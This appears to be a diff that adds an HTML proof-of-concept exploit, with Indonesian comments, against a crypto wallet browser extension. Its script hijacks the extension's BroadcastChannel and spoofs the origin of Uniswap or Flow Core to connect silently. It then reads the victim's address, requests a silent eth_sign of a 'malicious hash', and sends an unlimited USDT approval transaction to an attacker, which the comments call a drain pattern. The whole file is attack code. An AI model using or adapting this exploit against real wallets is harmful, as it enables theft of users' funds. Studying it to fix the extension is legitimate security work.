@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head><title>Hai</title></head>
+<body>
+
+<label>
+  <input type="checkbox" id="useFlowCore"> Silent Connect Use Flow Core (core.flow.com)
+</label>
+<br><br>
+
+<button id="attackAll">run</button>
+
+<pre id="log"></pre>
+
+<script>
+let channelName = null;
+let bc = null;
+let identCounter = 900;
+
+const L = (m, c='black') => {
+  const d = document.getElementById('log');
+  d.innerHTML += `<span style="color:${c}">[${new Date().toLocaleTimeString()}] ${m}\n</span>`;
+  d.scrollTop = d.scrollHeight;
+};
+
+function bcRequest(data) {
+  return new Promise((resolve, reject) => {
+    const ident = identCounter++;
+    const handler = (event) => {
+      const msg = event.data;
+      if (msg.type === 'response' && msg.data && msg.data.ident === ident) {
+        bc.removeEventListener('message', handler);
+        if (msg.data.err) {
+          reject(msg.data.err);
+        } else {
+          resolve(msg.data.res);
+        }
+      }
+    };
+    bc.addEventListener('message', handler);
+    bc.postMessage({
+      type: 'request',
+      data: {
+        ident: ident,
+        data: data
+      }
+    });
+    setTimeout(() => {
+      bc.removeEventListener('message', handler);
+      reject(new Error('Timeout'));
+    }, 12000);
+  });
+}
+
+document.getElementById('attackAll').onclick = async () => {
+  L('Start');
+
+  // ── 1. Baca Channel Name ───────────────────────────────────────────────
+  channelName = document.body.getAttribute('data-channel-name');
+  if (!channelName) {
+    L('data-channel-name tidak ditemukan. Ekstensi wallet mungkin tidak terpasang?', 'black');
+    return;
+  }
+  L(`Nama channel ditemukan: ${channelName}`, 'black');
+  bc = new BroadcastChannel(channelName);
+
+  // ── Pilih target origin ────────────────────────────────────────────────
+  const useFlow = document.getElementById('useFlowCore').checked;
+  let spoofedOrigin, displayName, iconUrl;
+
+  if (useFlow) {
+    spoofedOrigin = 'https://core.flow.com';
+    displayName   = 'Flow Core';
+    iconUrl       = '';  
+    L('Mode: Flow Core(https://core.flow.com) – silent connect target', 'black');
+  } else {
+    spoofedOrigin = 'https://app.uniswap.org';
+    displayName   = 'Uniswap';
+    iconUrl       = 'https://app.uniswap.org/favicon.ico';
+    L('Mode: Uniswap(https://app.uniswap.org) – default target', 'black');
+  }
+
+  //  2. Silent Connect / Spoof Origin via tabCheckin
+  L(`Mengirim silent tabCheckin ke: ${spoofedOrigin}`, 'black');
+  try {
+    const res = await bcRequest({
+      method: 'tabCheckin',
+      params: {
+        origin: spoofedOrigin,
+        name: displayName,
+        icon: iconUrl
+      }
+    });
+    L(`tabCheckin response: ${JSON.stringify(res)}`, 'black');
+    L(`Silent connect berhasil  background mengira ini ${displayName}`, 'black');
+  } catch(e) {
+    L(`tabCheckin gagal: ${e.message || JSON.stringify(e)}`, 'black');
+    L('Melanjutkan meski silent connect gagal (beberapa wallet mungkin toleran)', 'black');
+  }
+
+  // ── 3. Ambil Address Korban
+  L('Mendapatkan alamat korban...', 'black');
+  let victimAddr;
+  try {
+    let accounts = await bcRequest({ method: 'eth_accounts', params: [] });
+    if (!accounts || accounts.length === 0) {
+      L('eth_accounts kosong mencoba eth_requestAccounts...', 'black');
+      accounts = await bcRequest({ method: 'eth_requestAccounts', params: [] });
+    }
+    victimAddr = accounts?.[0];
+  } catch(e) {
+    L(`Gagal mendapatkan address: ${e.message || JSON.stringify(e)}`, 'black');
+    return;
+  }
+
+  if (!victimAddr) {
+    L('Tidak ada alamat yang didapat. Origin mungkin belum pernah di-approve.', 'black');
+    return;
+  }
+  L(`Alamat korban: ${victimAddr}`, 'black');
+
+  // ── 4. eth_sign (silent)
+  const maliciousHash = '0xd505accbf1b1e559def4cda57fac858e01aae961ef7e1b9a793a7c7ef2c2914e';
+  L(`Menandatangani hash berbahaya: ${maliciousHash}`, 'black');
+  L('Seharusnya tidak muncul popup sama sekali...', 'black');
+
+  let signature = null;
+  try {
+    signature = await bcRequest({
+      method: 'eth_sign',
+      params: [victimAddr, maliciousHash]
+    });
+    L('!!! eth_sign BERHASIL (silent) !!!', 'black');
+    L(`Signature: ${signature}`, 'black');
+  } catch(e) {
+    L(`eth_sign gagal: ${e.message || JSON.stringify(e)}`, 'black');
+  }
+
+  // ── 5. Kirim Transaksi Berbahaya
+  L('', 'black');
+  L('Mengirim transaksi approve USDT max → attacker (contoh drain pattern)', 'black');
+
+  const maliciousTx = {
+    from: victimAddr,
+    to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    data: 'PWNED BY BADCAT\n' +
+          '0000000000000000000000007d8bf18c7ce84b3e90a21e5728' +
+          'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+    gas: '0x' + (90000).toString(16),
+    gasPrice: '0x' + (30 * 1e9).toString(16), // 30 gwei
+    
+  };
+
+  try {
+    const txHash = await bcRequest({
+      method: 'eth_sendTransaction',
+      params: [maliciousTx]
+    });
+
+    L('TRANSAKSI BERBAHAYA BERHASIL DIKIRIM', 'black');
+    L(`Tx hash: ${txHash}`, 'black');
+   
+  } catch(e) {
+    
+  }
+
+  // ── Ringkasan Akhir ────────────────────────────────────────────────────
+  L('', 'black');
+  L('Hasil', 'black');
+  L(`Target spoofed  : ${spoofedOrigin} (${displayName})`, 'black');
+  L(`Real origin     : ${location.origin}`, 'black');
+  L(`Victim address  : ${victimAddr}`, 'black');
+  L(`eth_sign result : ${signature || 'gagal'}`, 'black');
+  L('SELESAI', 'black');
+};
+</script>
+</body>
+</html>
